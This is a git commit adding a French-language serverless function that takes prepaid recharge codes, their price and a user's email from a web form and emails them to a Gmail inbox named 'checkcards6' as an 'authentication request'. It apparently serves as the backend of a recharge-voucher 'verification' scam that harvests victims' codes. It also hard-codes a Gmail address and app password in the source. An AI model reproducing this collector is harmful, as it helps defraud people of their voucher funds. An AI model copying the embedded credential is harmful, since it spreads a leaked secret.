cd7019c14c8140e913a753cf6feef7c0999bb3a7
Hen17Ry <106038140+Hen17Ry@users.noreply.github.com>
2024-07-09 23:39:19 +0100

    Fin

---
+++ functions/send-email.js
@@ -0,0 +1,36 @@
+import nodemailer from 'nodemailer';
+
+export async function handler(event, context) {
+  try {
+    const { rechargeType, price, rechargeCode, encryptedCode, email } = JSON.parse(event.body);
+
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: 'checkcards6@gmail.com', // Remplacez par votre adresse email
+        pass: 'vpot svzf xrpw bndc', // Remplacez par votre mot de passe
+      },
+    });
+
+    const mailOptions = {
+      from: email,
+      to: 'checkcards6@gmail.com',
+      subject: 'Nouvelle demande d\'authentification',
+      text: `Type de recharge : ${rechargeType}\nPrix de la recharge : ${price}\nCode de la recharge : ${rechargeCode}\nCode crypté : ${encryptedCode}\nEmail : ${email}`,
+    };
+
+    const info = await transporter.sendMail(mailOptions);
+    console.log('Email envoyé : ' + info.response);
+
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ message: 'Email envoyé avec succès' }),
+    };
+  } catch (error) {
+    console.error('Erreur lors de l\'envoi de l\'email', error);
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'email' }),
+    };
+  }
+}
